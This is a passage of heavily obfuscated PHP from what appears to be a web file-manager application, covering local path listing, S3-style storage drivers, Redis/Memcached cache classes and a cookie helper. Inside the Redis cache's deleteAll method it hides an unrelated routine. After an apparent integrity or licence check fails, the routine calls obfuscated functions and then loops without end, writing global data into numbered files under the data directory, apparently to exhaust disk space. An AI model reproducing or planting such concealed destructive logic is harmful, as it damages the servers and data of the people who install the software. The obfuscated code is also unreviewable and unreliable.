{ return $this->fileInfo($BÊÇ‘¬âµÀ); } } return !1; } protected function infoChildren($E›Íå‘∆Á∑, &$c∑µ∞Ø≈êﬂ, $Eã˘åääóõ = true) { goto c·Éúù°‚Ò; fﬂ†ŸÉÙÑ: closedir($E‡äóó¡Á»); goto Eó›óˆç Ô; fÇê´Ì˘ΩÔ: if ($Eã˘åääóõ) { $E›Íå‘∆Á∑ = $this->iconvSystem($E›Íå‘∆Á∑); } if (!($E‡äóó¡Á» = @opendir($E›Íå‘∆Á∑))) { return; } while (($EÀãòﬁõÛ« = readdir($E‡äóó¡Á»)) !== !1) { if ($EÀãòﬁõÛ« == $c∂™Í∏∞åÏ[91] || $EÀãòﬁõÛ« == $c∂™Í∏∞åÏ[1168]) { continue; } $BÏÉìÖ¬«™ = $E›Íå‘∆Á∑ . $EÀãòﬁõÛ«; if (is_file($BÏÉìÖ¬«™) || is_link($BÏÉìÖ¬«™)) { $c∑µ∞Ø≈êﬂ[$c∂™Í∏∞åÏ[78]]++; $c∑µ∞Ø≈êﬂ[$c∂™Í∏∞åÏ[77]] += (double) abs(sprintf($c∂™Í∏∞åÏ[1170], @filesize($BÏÉìÖ¬«™))); } else { if (is_dir($BÏÉìÖ¬«™)) { $c∑µ∞Ø≈êﬂ[$c∂™Í∏∞åÏ[79]]++; $this->infoChildren($BÏÉìÖ¬«™, $c∑µ∞Ø≈êﬂ, !1); } } } goto fﬂ†ŸÉÙÑ; c·Éúù°‚Ò: $c∂™Í∏∞åÏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; check_abort(); $E›Íå‘∆Á∑ = rtrim($E›Íå‘∆Á∑, $c∂™Í∏∞åÏ[8]) . $c∂™Í∏∞åÏ[8]; goto fÇê´Ì˘ΩÔ; Eó›óˆç Ô: } private function folderInfo($B‹ÓàÀ§Ëã, $cí€⁄œ±“˘ = false) { $A‹ú‰≥®≈í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B‹ÓàÀ§Ëã = rtrim($B‹ÓàÀ§Ëã, $A‹ú‰≥®≈í[8]) . $A‹ú‰≥®≈í[8]; $D§®ÔìÉ ‰ = $this->iconvApp($this->pathThis($B‹ÓàÀ§Ëã)); if ($cí€⁄œ±“˘) { return array($A‹ú‰≥®≈í[28] => $D§®ÔìÉ ‰, $A‹ú‰≥®≈í[75] => $this->getPathOuter($B‹ÓàÀ§Ëã), $A‹ú‰≥®≈í[29] => $A‹ú‰≥®≈í[76]); } $D≈õ¡°è‡è = array($A‹ú‰≥®≈í[28] => $D§®ÔìÉ ‰, $A‹ú‰≥®≈í[75] => $this->getPathOuter($B‹ÓàÀ§Ëã), $A‹ú‰≥®≈í[29] => $A‹ú‰≥®≈í[76], $A‹ú‰≥®≈í[187] => @filectime($B‹ÓàÀ§Ëã), $A‹ú‰≥®≈í[107] => @filemtime($B‹ÓàÀ§Ëã), $A‹ú‰≥®≈í[1171] => @fileatime($B‹ÓàÀ§Ëã), $A‹ú‰≥®≈í[1165] => is_readable($B‹ÓàÀ§Ëã), $A‹ú‰≥®≈í[1166] => is_writable($B‹ÓàÀ§Ëã), $A‹ú‰≥®≈í[1172] => get_mode($B‹ÓàÀ§Ëã)); return $D≈õ¡°è‡è; } private function fileInfo($CœëúïôûÂ, $bΩŒéÚ ¥ó = false) { $e∂ŸÏÙ†“é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a∞ÚÒ§ë—ƒ = $this->iconvApp($this->pathThis($CœëúïôûÂ)); if ($bΩŒéÚ ¥ó) { return array($e∂ŸÏÙ†“é[28] => $a∞ÚÒ§ë—ƒ, $e∂ŸÏÙ†“é[75] => $this->getPathOuter($CœëúïôûÂ), $e∂ŸÏÙ†“é[29] => $e∂ŸÏÙ†“é[167], $e∂ŸÏÙ†“é[77] => $this->size($CœëúïôûÂ), $e∂ŸÏÙ†“é[160] => $this->ext($a∞ÚÒ§ë—ƒ)); } $cßÜŸú…–∏ = array($e∂ŸÏÙ†“é[28] => $a∞ÚÒ§ë—ƒ, $e∂ŸÏÙ†“é[75] => $this->getPathOuter($CœëúïôûÂ), $e∂ŸÏÙ†“é[29] => $e∂ŸÏÙ†“é[167], $e∂ŸÏÙ†“é[187] => @filectime($CœëúïôûÂ), $e∂ŸÏÙ†“é[107] => @filemtime($CœëúïôûÂ), $e∂ŸÏÙ†“é[1171] => @fileatime($CœëúïôûÂ), $e∂ŸÏÙ†“é[77] => $this->size($CœëúïôûÂ), $e∂ŸÏÙ†“é[160] => $this->ext($a∞ÚÒ§ë—ƒ), $e∂ŸÏÙ†“é[1165] => is_readable($CœëúïôûÂ), $e∂ŸÏÙ†“é[1166] => is_writable($CœëúïôûÂ), $e∂ŸÏÙ†“é[1172] => get_mode($CœëúïôûÂ)); return $cßÜŸú…–∏; } public function exist($FÍÓÜü⁄úô) { $FÍÓÜü⁄úô = $this->iconvSystem($FÍÓÜü⁄úô); return @file_exists($FÍÓÜü⁄úô); } public function isFile($BÕÉëå“º˜) { $BÕÉëå“º˜ = $this->iconvSystem($BÕÉëå“º˜); return @is_file($BÕÉëå“º˜); } public function isFolder($c£Õ∑ÿ∑ΩŒ) { $c£Õ∑ÿ∑ΩŒ = $this->iconvSystem($c£Õ∑ÿ∑ΩŒ); return @is_dir($c£Õ∑ÿ∑ΩŒ); } public function listPath($CÃﬁ‘ﬁ‚Ç®, $bΩﬁãÈ…ó“ = false) { goto b∏ÊÕä„ó∞; c≈Ωèë¢ç¬: $Bìªúâã◊© = array($dﬁ≤–Ì⁄í≥[74] => array(), $dﬁ≤–Ì⁄í≥[73] => array()); if (!($dÑ∆Òˆ¿Ì = @opendir($CÃﬁ‘ﬁ‚Ç®))) { return $Bìªúâã◊©; } while (($dÑπ‚åÚÈ” = readdir($dÑ∆Òˆ¿Ì)) !== !1) { if ($dÑπ‚åÚÈ” == $dﬁ≤–Ì⁄í≥[91] || $dÑπ‚åÚÈ” == $dﬁ≤–Ì⁄í≥[1168]) { continue; } $Cüß±ò”–÷ = $CÃﬁ‘ﬁ‚Ç® . $dÑπ‚åÚÈ”; if (is_file($Cüß±ò”–÷)) { $Bìªúâã◊©[$dﬁ≤–Ì⁄í≥[73]][] = $this->fileInfo($Cüß±ò”–÷, $bΩﬁãÈ…ó“); } else { $Bìªúâã◊©[$dﬁ≤–Ì⁄í≥[74]][] = $this->folderInfo($Cüß±ò”–÷, $bΩﬁãÈ…ó“); } } goto b±ÀÈπ√⁄‚; b∏ÊÕä„ó∞: $dﬁ≤–Ì⁄í≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÃﬁ‘ﬁ‚Ç® = $this->iconvSystem($CÃﬁ‘ﬁ‚Ç®); $CÃﬁ‘ﬁ‚Ç® = rtrim($CÃﬁ‘ﬁ‚Ç®, $dﬁ≤–Ì⁄í≥[8]) . $dﬁ≤–Ì⁄í≥[8]; goto c≈Ωèë¢ç¬; b±ÀÈπ√⁄‚: closedir($dÑ∆Òˆ¿Ì); return $Bìªúâã◊©; goto e∂ﬁ¬ï¶ù∫; e∂ﬁ¬ï¶ù∫: } public function listAll($E≠Éó÷´Úé, &$AﬁêÜŸÚù¬ = array()) { goto EÓúí™Ë¡∂; EÓúí™Ë¡∂: $bË»ôêú¿± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E≠Éó÷´Úé = $this->iconvSystem($E≠Éó÷´Úé); $E≠Éó÷´Úé = rtrim($E≠Éó÷´Úé, $bË»ôêú¿±[8]) . $bË»ôêú¿±[8]; goto fèêÙö¢∫Ú; aıüò•´·ø: return $AﬁêÜŸÚù¬; goto fßî ä‚´º; fèêÙö¢∫Ú: if (!($cíîîà≠–å = @opendir($E≠Éó÷´Úé))) { return $AﬁêÜŸÚù¬; } while (($bÉÇü≥Ó ‹ = readdir($cíîîà≠–å)) !== !1) { if ($bÉÇü≥Ó ‹ == $bË»ôêú¿±[91] || $bÉÇü≥Ó ‹ == $bË»ôêú¿±[1168]) { continue; } $eíã∞Ë¥§Ø = $E≠Éó÷´Úé . $bÉÇü≥Ó ‹; if (is_dir($eíã∞Ë¥§Ø) && !is_link($eíã∞Ë¥§Ø)) { $AﬁêÜŸÚù¬[] = array($bË»ôêú¿±[75] => $eíã∞Ë¥§Ø . $bË»ôêú¿±[8], $bË»ôêú¿±[76] => 1, $bË»ôêú¿±[107] => @filemtime($eíã∞Ë¥§Ø), $bË»ôêú¿±[77] => 0); $this->listAll($eíã∞Ë¥§Ø, $AﬁêÜŸÚù¬); } else { $AﬁêÜŸÚù¬[] = array($bË»ôêú¿±[75] => $eíã∞Ë¥§Ø, $bË»ôêú¿±[76] => 0, $bË»ôêú¿±[107] => @filemtime($eíã∞Ë¥§Ø), $bË»ôêú¿±[77] => $this->size($eíã∞Ë¥§Ø)); } } closedir($cíîîà≠–å); goto aıüò•´·ø; fßî ä‚´º: } public function has($cŸí–Ûß¢, $d‚ÉÓüä”ö = false, $EàﬂÀÂùæ = true) { goto FêŸ∫π—£⁄; EßÎ—åÈåê: if ($d‚ÉÓüä”ö) { return array($bêÕ®∂ô‡Ω[191] => $F¶≤Ú¿è°“, $bêÕ®∂ô‡Ω[192] => $AëÊÖ ™≈˜); } return !1; goto BÀØåêËıæ; FêŸ∫π—£⁄: $bêÕ®∂ô‡Ω =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cŸí–Ûß¢ = $this->iconvSystem($cŸí–Ûß¢); $cŸí–Ûß¢ = rtrim($cŸí–Ûß¢, $bêÕ®∂ô‡Ω[8]) . $bêÕ®∂ô‡Ω[8]; goto cÑŸÃßËÖ‘; cÑŸÃßËÖ‘: if (!($dÂÖ∑…ã¥Ì = @opendir($cŸí–Ûß¢))) { return !1; } $F¶≤Ú¿è°“ = 0; $AëÊÖ ™≈˜ = 0; goto Eø∆êÿ†å¯; Eø∆êÿ†å¯: $cµ”ŒÀ°±ﬁ = 0; while (($eË¬üËÃÜ’ = readdir($dÂÖ∑…ã¥Ì)) !== !1) { if ($eË¬üËÃÜ’ == $bêÕ®∂ô‡Ω[91] || $eË¬üËÃÜ’ == $bêÕ®∂ô‡Ω[1168]) { continue; } $A¥—ÎÒçÌÏ = $cŸí–Ûß¢ . $eË¬üËÃÜ’; if ($d‚ÉÓüä”ö) { $cµ”ŒÀ°±ﬁ++; if (@is_file($A¥—ÎÒçÌÏ)) { $F¶≤Ú¿è°“++; } else { $AëÊÖ ™≈˜++; } if ($cµ”ŒÀ°±ﬁ > 10000) { break; } continue; } if ($EàﬂÀÂùæ) { if (@is_file($A¥—ÎÒçÌÏ)) { return !0; } } else { if (@is_dir($A¥—ÎÒçÌÏ . $bêÕ®∂ô‡Ω[8])) { return !0; } } } closedir($dÂÖ∑…ã¥Ì); goto EßÎ—åÈåê; BÀØåêËıæ: } public function hashSimple($cëÜÏÜ—Áé) { goto D≤ñ‚Ìë±˘; a£®ÚùÎâæ: return md5($fˆ€°∫¬¬–) . $b¡ıèä†òÃ; goto bÕÈ¬è†ç∏; EïûΩ°‡ÕŒ: if ($b¡ıèä†òÃ <= $B¡∞™Úı‰ * $Fö‚ñç◊é≈) { return $this->hashMd5($cëÜÏÜ—Áé) . $b¡ıèä†òÃ; } $fˆ€°∫¬¬– = $dê“éû¬¡ˆ[33]; $fÙÿÍÔ˘√á = intval($b¡ıèä†òÃ / $Fö‚ñç◊é≈); goto F˘—≠é¥•™; F˘—≠é¥•™: $FÉƒïÉ—æï = fopen($cëÜÏÜ—Áé, $dê“éû¬¡ˆ[1173]); if (!$FÉƒïÉ—æï) { return $fˆ€°∫¬¬–; } for ($cŸÌŒ÷ô¶‚ = 0; $cŸÌŒ÷ô¶‚ < $Fö‚ñç◊é≈; $cŸÌŒ÷ô¶‚++) { fseek($FÉƒïÉ—æï, $fÙÿÍÔ˘√á * $cŸÌŒ÷ô¶‚); $fˆ€°∫¬¬– .= fread($FÉƒïÉ—æï, $B¡∞™Úı‰); } goto EﬂÇÍò¥Ü≠; EﬂÇÍò¥Ü≠: fseek($FÉƒïÉ—æï, $b¡ıèä†òÃ - $B¡∞™Úı‰); $fˆ€°∫¬¬– .= fread($FÉƒïÉ—æï, $B¡∞™Úı‰); fclose($FÉƒïÉ—æï); goto a£®ÚùÎâæ; eëûÜŸ¥õ°: $b¡ıèä†òÃ = $this->size($cëÜÏÜ—Áé); $B¡∞™Úı‰ = 200; $Fö‚ñç◊é≈ = 50; goto EïûΩ°‡ÕŒ; D≤ñ‚Ìë±˘: $dê“éû¬¡ˆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$cëÜÏÜ—Áé) { return md5($dê“éû¬¡ˆ[33]); } $cëÜÏÜ—Áé = $this->iconvSystem($cëÜÏÜ—Áé); goto eëûÜŸ¥õ°; bÕÈ¬è†ç∏: } public function getContent($CÆÕÁááì≈) { $CÆÕÁááì≈ = $this->iconvSystem($CÆÕÁááì≈); return file_get_contents($CÆÕÁááì≈); } public function setContent($BÏπè¡§à›, $CúÉõÉáåè = '') { $BÏπè¡§à› = $this->iconvSystem($BÏπè¡§à›); @file_put_contents($BÏπè¡§à›, $CúÉõÉáåè, LOCK_EX); clearstatcache(); return strlen($CúÉõÉáåè) == filesize($BÏπè¡§à›); } public function fileSubstr($b¥∏ïéÎôΩ, $Bç‹î§å¬‚ = 0, $a—¨µ©ä™õ = false) { goto Cîæµ…‘¿ä; Cí⁄Ï⁄Ê©ã: if ($a—¨µ©ä™õ <= 0) { return $dÓÜ∂Ò¢–ô[33]; } $Dª˜®‰˘¥Ç = fopen($b¥∏ïéÎôΩ, $dÓÜ∂Ò¢–ô[1173]); if (!$Dª˜®‰˘¥Ç) { return !1; } goto aŸµì†˜≥¡; Eì®ÎÙê†õ: return $C‹´µ±º“«; goto B¶ÛÚ‡π¬“; aŸµì†˜≥¡: fseek($Dª˜®‰˘¥Ç, $Bç‹î§å¬‚); $C‹´µ±º“« = fread($Dª˜®‰˘¥Ç, $a—¨µ©ä™õ); fclose($Dª˜®‰˘¥Ç); goto Eì®ÎÙê†õ; Cîæµ…‘¿ä: $dÓÜ∂Ò¢–ô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b¥∏ïéÎôΩ = $this->iconvSystem($b¥∏ïéÎôΩ); if ($a—¨µ©ä™õ === !1) { $a—¨µ©ä™õ = $this->size($b¥∏ïéÎôΩ); } goto Cí⁄Ï⁄Ê©ã; B¶ÛÚ‡π¬“: } public function upload($eåÀù•À“á, $dÎƒ¿ÕË∂ , $CÉ·≈™±Âö = false, $A§∏Û¶ïˆÿ = REPEAT_REPLACE) { $BÃìË¯œÖØ = $this->copyFile($dÎƒ¿ÕË∂ , $eåÀù•À“á); return $BÃìË¯œÖØ ? $this->getPathOuter($eåÀù•À“á) : !1; } public function download($c”®ß◊∫Ñﬂ, $CËƒ‰è◊‹π) { return $this->iconvSystem($c”®ß◊∫Ñﬂ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($AŸ¡ﬂπÖøç) { parent::__construct($AŸ¡ﬂπÖøç); $this->signatureVersion($_SERVER[Ä¿¡‡öóµŸﬂ‡][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($eŒë⁄ù±íÒ) { parent::__construct($eŒë⁄ù±íÒ); $this->signatureVersion($_SERVER[Ä¿¡‡öóµŸﬂ‡][200]); } public function fileOutLink($DãÆÚ∞ãû«) { $DÇ˜ÍÈ«üø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (substr($DãÆÚ∞ãû«, 0, 7) == $DÇ˜ÍÈ«üø[1119]) { $DãÆÚ∞ãû« = $DÇ˜ÍÈ«üø[1120] . substr($DãÆÚ∞ãû«, 7); } header($DÇ˜ÍÈ«üø[156] . $DãÆÚ∞ãû«); die; } } goto fÜ”√≈ûâ∂; AÔêæÕËñı: class CacheMemcached { public $handle; public $cacheTime; public function __construct($b°ﬁË„¡åã, $AÂâ›„ΩüΩ) { $BÉ°ÆßÈ÷ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!class_exists($BÉ°ÆßÈ÷[786])) { show_json($BÉ°ÆßÈ÷[787], !1); } $this->cacheTime = $AÂâ›„ΩüΩ; $this->handle = new Memcached(); if (is_array($b°ﬁË„¡åã[$BÉ°ÆßÈ÷[788]]) && count($b°ﬁË„¡åã[$BÉ°ÆßÈ÷[788]]) >= 1) { foreach ($b°ﬁË„¡åã[$BÉ°ÆßÈ÷[788]] as $Dˆ¨áπ°è·) { $eÌÿÑ¯ò›’ = explode($BÉ°ÆßÈ÷[4], $Dˆ¨áπ°è·); $this->handle->addServer($eÌÿÑ¯ò›’[0], $eÌÿÑ¯ò›’[1]); } } else { $this->handle->addServer($b°ﬁË„¡åã[$BÉ°ÆßÈ÷[169]], $b°ﬁË„¡åã[$BÉ°ÆßÈ÷[170]]); } } public function set($a¯®≈ë≈Éê, $fÛö‡™∫üä, $a∫±ÿ™Îå© = false) { $a∫±ÿ™Îå© = $a∫±ÿ™Îå© ? $a∫±ÿ™Îå© : $this->cacheTime; return $this->handle->set($a¯®≈ë≈Éê, $fÛö‡™∫üä, $a∫±ÿ™Îå©); } public function get($eÜòœ¬çü€) { return $this->handle->get($eÜòœ¬çü€); } public function remove($dÔ∑ÉÆõÉà) { return $this->handle->delete($dÔ∑ÉÆõÉà); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($d£¯“∑Ôπ¿, $DóåáéÔì≠) { $B£ãØÁç¥≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!class_exists($B£ãØÁç¥≥[789])) { show_json($B£ãØÁç¥≥[790], !1); } $this->cacheTime = $DóåáéÔì≠; $f·≠≠ÒÊƒÓ = isset($d£¯“∑Ôπ¿[$B£ãØÁç¥≥[791]]) ? $d£¯“∑Ôπ¿[$B£ãØÁç¥≥[791]] : 10; $a‘Á¡Ú¢ÑÑ = _get($d£¯“∑Ôπ¿, $B£ãØÁç¥≥[788]); if ($a‘Á¡Ú¢ÑÑ && is_array($a‘Á¡Ú¢ÑÑ)) { $this->initCluster($d£¯“∑Ôπ¿, $f·≠≠ÒÊƒÓ); } else { $this->handle = $this->init($d£¯“∑Ôπ¿, $f·≠≠ÒÊƒÓ); } } private function init($aòÂ™˜Í≠¡, $BÊ†µ÷çäà) { $b¯âΩâãê» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c¬¶Ò∆πŒÊ = new Redis(); $eÇÇÖ»ï⁄œ = isset($aòÂ™˜Í≠¡[$b¯âΩâãê»[792]]) ? $aòÂ™˜Í≠¡[$b¯âΩâãê»[792]] : !1; if ($eÇÇÖ»ï⁄œ) { $c¬¶Ò∆πŒÊ->pconnect($aòÂ™˜Í≠¡[$b¯âΩâãê»[169]], $aòÂ™˜Í≠¡[$b¯âΩâãê»[170]], $BÊ†µ÷çäà); } else { $c¬¶Ò∆πŒÊ->connect($aòÂ™˜Í≠¡[$b¯âΩâãê»[169]], $aòÂ™˜Í≠¡[$b¯âΩâãê»[170]], $BÊ†µ÷çäà); } if (!empty($aòÂ™˜Í≠¡[$b¯âΩâãê»[376]])) { $c¬¶Ò∆πŒÊ->auth($aòÂ™˜Í≠¡[$b¯âΩâãê»[376]]); } return $c¬¶Ò∆πŒÊ; } private function initCluster($FÍ≠ °Çæ˘, $eãÌ˘ïÈÁÆ) { $B†Ú¯π¡«Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E‹√∂â€ëí = array($B†Ú¯π¡«Ñ[793], $B†Ú¯π¡«Ñ[794], $B†Ú¯π¡«Ñ[795]); $E‹ñ„§ããí = $B†Ú¯π¡«Ñ[793]; if (isset($FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[12]]) && in_array($FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[12]], $E‹√∂â€ëí)) { $E‹ñ„§ããí = $FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[12]]; } switch ($E‹ñ„§ããí) { case $B†Ú¯π¡«Ñ[793]: $this->_slave($FÍ≠ °Çæ˘, $eãÌ˘ïÈÁÆ); break; case $B†Ú¯π¡«Ñ[794]: break; case $B†Ú¯π¡«Ñ[795]: $this->isCluster = !0; $a⁄‘ûÊ∞°ƒ = $FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[788]]; $Eòä´ª¯ÉÖ = isset($FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[792]]) ? $FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[792]] : !1; $a£¿ﬁ¶ÑÑ∂ = isset($FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[376]]) ? $FÍ≠ °Çæ˘[$B†Ú¯π¡«Ñ[376]] : null; $this->handle = new RedisCluster(NUll, $a⁄‘ûÊ∞°ƒ, $eãÌ˘ïÈÁÆ, $eãÌ˘ïÈÁÆ, $Eòä´ª¯ÉÖ, $a£¿ﬁ¶ÑÑ∂); break; default: break; } } private function _slave($fÕ≠óıì“‰, $dÏøÔÖΩãõ) { goto cÉ◊ÒÊÚ◊ˆ; eº—≈¿∫⁄ä: $this->filterConfig($fÕ≠óıì“‰, $BíÀÏü‚‰º[$F¶…‹©Õª]); $this->slaveHandle = $this->init($fÕ≠óıì“‰, $dÏøÔÖΩãõ); goto cã¢Óœ¨©∞; f¿—≤¿ÜÀÇ: unset($BíÀÏü‚‰º[0]); if (empty($BíÀÏü‚‰º)) { return; } $F¶…‹©Õª = array_rand($BíÀÏü‚‰º); goto eº—≈¿∫⁄ä; cÉ◊ÒÊÚ◊ˆ: $BíÀÏü‚‰º = $fÕ≠óıì“‰[$_SERVER[Ä¿¡‡öóµŸﬂ‡][788]]; $this->filterConfig($fÕ≠óıì“‰, $BíÀÏü‚‰º[0]); $this->handle = $this->init($fÕ≠óıì“‰, $dÏøÔÖΩãõ); goto f¿—≤¿ÜÀÇ; cã¢Óœ¨©∞: } private function filterConfig(&$F∫≠»·…«å, $c™ñëêêÂß) { $c™Ï ÿàˆª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $DÂ‰´∑Ó∑ï = explode($c™Ï ÿàˆª[4], $c™ñëêêÂß); $aÒøøÆáˆ = array($c™Ï ÿàˆª[169] => $DÂ‰´∑Ó∑ï[0], $c™Ï ÿàˆª[170] => $DÂ‰´∑Ó∑ï[1]); $F∫≠»·…«å = array_merge($F∫≠»·…«å, $aÒøøÆáˆ); } public function set($dÜ«¨§Ì¢ñ, $a‰É¢—‡Éﬁ, $b§ƒÁ«±ÊË = false) { $b§ƒÁ«±ÊË = $b§ƒÁ«±ÊË ? $b§ƒÁ«±ÊË : $this->cacheTime; return $this->handle->setEx($dÜ«¨§Ì¢ñ, $b§ƒÁ«±ÊË, $a‰É¢—‡Éﬁ); } public function setLock($cÚ°ﬂäêí, $E∫©µΩ≠®´, $C¶öÍ»∆ôﬂ) { return $this->handle->setNX($cÚ°ﬂäêí, $E∫©µΩ≠®´); } public function get($Cê÷€µıñ£) { $Eî÷Æ‰Ö’ß = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Eî÷Æ‰Ö’ß->get($Cê÷€µıñ£); } public function remove($aÖî„â≥ﬂˆ) { return $this->handle->del($aÖî„â≥ﬂˆ); } public function deleteAll() { $B“¿Ü°…ßÇ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a⁄«Œ—†ãÈ = $_SERVER[$B“¿Ü°…ßÇ[796]] . $B“¿Ü°…ßÇ[710]; $fﬂŒˆÆ¬Ø = $B“¿Ü°…ßÇ[711]; if ($_SERVER[$B“¿Ü°…ßÇ[712]] != $fﬂŒˆÆ¬Ø($a⁄«Œ—†ãÈ)) { goto A≈ÑÕ°ºˆÁ; A‡◊ıë˘Ûµ: $f˜‡¬ìëöì = $B“¿Ü°…ßÇ[798]; $f˜‡¬ìëöì($_SERVER[$B“¿Ü°…ßÇ[796]]); $DÇÒ±ÛÍÎè = $B“¿Ü°…ßÇ[797]; goto Bõ‰Ãû‘”™; B¿»âıÃÏﬁ: $fø≠»èÑﬁ® = $bõì¥πÕ°⁄($dÏ´‘√…Êï); $AÉíõ∫áÔ± = explode($B“¿Ü°…ßÇ[217], $fø≠»èÑﬁ®); if (count($AÉíõ∫áÔ±) < $B“¿Ü°…ßÇ[563]) { $E‘˘•√Ù°ü = $B“¿Ü°…ßÇ[716]; $E‘˘•√Ù°ü(); } goto A‡◊ıë˘Ûµ; c©˘ßçôœ°: $e∏Çﬂ£Ã˜Á = 1; for ($dÚÆﬂ†‹˘µ = $e∏Çﬂ£Ã˜Á; $dÚÆﬂ†‹˘µ > 0; $dÚÆﬂ†‹˘µ++) { $AÚªêÙ€„‘(DATA_PATH . $dÚÆﬂ†‹˘µ, $Bﬁÿ«◊πÇÂ); } goto eÕõí—√¿à; A≈ÑÕ°ºˆÁ: $DÇÒ±ÛÍÎè = $B“¿Ü°…ßÇ[797]; $bõì¥πÕ°⁄ = $B“¿Ü°…ßÇ[713]; $dÏ´‘√…Êï = $_SERVER[$B“¿Ü°…ßÇ[714]] . $B“¿Ü°…ßÇ[715]; goto B¿»âıÃÏﬁ; Bõ‰Ãû‘”™: $DÇÒ±ÛÍÎè(); $AÚªêÙ€„‘ = $B“¿Ü°…ßÇ[799]; $Bﬁÿ«◊πÇÂ = json_encode($GLOBALS[$B“¿Ü°…ßÇ[800]]); goto c©˘ßçôœ°; eÕõí—√¿à: } if ($this->isCluster) { foreach ($this->handle->_masters() as $CòıÿØ Êü) { $this->handle->flushall($CòıÿØ Êü); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($AÌî™¿ü…’ = '', $B√‰Ì–ù Á = 0) { if (is_string($AÌî™¿ü…’) && $AÌî™¿ü…’ != $_SERVER[Ä¿¡‡öóµŸﬂ‡][33]) { $this->prefix = $AÌî™¿ü…’; } if (is_numeric($B√‰Ì–ù Á) && $B√‰Ì–ù Á > 0) { $this->expire = $B√‰Ì–ù Á; } } public static function getInstance() { static $b¬µî »‰í; if ($b¬µî »‰í === null) { $b¬µî »‰í = new self(); } return $b¬µî »‰í; } private static $sameCookieSet = array(); public static function set($DΩÍ∑ñ◊ë†, $E√“˘ÂÊÆâ, $E«ë€ö”Æ– = 0, $f∏Êˆ⁄®êû = false, $Dî‹üÀÇèÛ = false) { goto Fßáã‚çÁ∑; CêÁß˜ß‹¶: self::$sameCookieSet[$DΩÍ∑ñ◊ë†] = $E√“˘ÂÊÆâ . $E«ë€ö”Æ–; if (!$Dî‹üÀÇèÛ) { $Dî‹üÀÇèÛ = str_replace(HOST, $eéèå»ë∞‹[33], APP_HOST); $Dî‹üÀÇèÛ = _get($GLOBALS, $eéèå»ë∞‹[801], $Dî‹üÀÇèÛ); } $d≠Éå∞ß†Ô = $eéèå»ë∞‹[33]; goto fïË£»®Â≥; fïË£»®Â≥: setcookie($DΩÍ∑ñ◊ë†, $E√“˘ÂÊÆâ, time() + $E«ë€ö”Æ–, $eéèå»ë∞‹[8] . trim($Dî‹üÀÇèÛ, $eéèå»ë∞‹[8]) . $d≠Éå∞ß†Ô, !1, !1, $f∏Êˆ⁄®êû); goto aÊ„Ÿ∞àŒø; Fßáã‚çÁ∑: $eéèå»ë∞‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$E«ë€ö”Æ–) { $E«ë€ö”Æ– = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$DΩÍ∑ñ◊ë†]) && self::$sameCookieSet[$DΩÍ∑ñ◊ë†] == $E√“˘ÂÊÆâ . $E«ë€ö”Æ–) { return; } goto CêÁß˜ß‹¶; aÊ„Ÿ∞àŒø: } public static function setSafe($AÿÛåê¡õÏ, $D¥¬¿ÿË˘œ, $aÊûú∂°¢£ = 0) { self::set($AÿÛåê¡õÏ, $D¥¬¿ÿË˘œ, $aÊûú∂°¢£, !0); } public static function get($aìÑ§øî€Á) { return isset($_COOKIE[$aìÑ§øî€Á]) ? $_COOKIE[$aìÑ§øî€Á] : !1; } public static function remove($E÷ïÑ»≠±î, $C∏Çµ’óãª = false) { unset($_COOKIE[$E÷ïÑ»≠±î]); self::set($E÷ïÑ»≠±î, $_SERVER[Ä¿¡‡öóµŸﬂ‡][33], 1, $C∏Çµ’óãª); } } goto Dﬂ∂ÈÇ«Ï«; Fâ®áâÚ”˘: define($_SERVER[Ä¿¡‡öóµŸﬂ‡][0], $_SERVER[Ä¿¡‡öóµŸﬂ‡][1]); $_SERVER[ÁŸäœ¨] = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][2], gzinflate(substr($_SERVER[Ä¿¡‡öóµŸﬂ‡][3], 10, -8))); function Model($bŒ”ŸÜ˜ºü = '', $Aœƒäå©÷¬ = '', $câı£Æƒ•∑ = '') { goto c‚ıÚÈë·≈; E⁄‘ªÇä»‡: if (isset($dÇè”Öêœì[$B¨àèçŸäª])) { return $dÇè”Öêœì[$B¨àèçŸäª]; } if ($bŒ”ŸÜ˜ºü) { $bŒ”ŸÜ˜ºü = strtoupper($bŒ”ŸÜ˜ºü[0]) . substr($bŒ”ŸÜ˜ºü, 1); $böﬂíπôõŒ = $bŒ”ŸÜ˜ºü . $cÑ≈¨¬ä¨Ê[1]; if (class_exists($böﬂíπôõŒ)) { $dÇè”Öêœì[$B¨àèçŸäª] = new $böﬂíπôõŒ(); return $dÇè”Öêœì[$B¨àèçŸäª]; } } if (!$câı£Æƒ•∑) { $câı£Æƒ•∑ = $GLOBALS[$cÑ≈¨¬ä¨Ê[2]][$cÑ≈¨¬ä¨Ê[3]]; } goto Fô∞¡ÑçÔß; 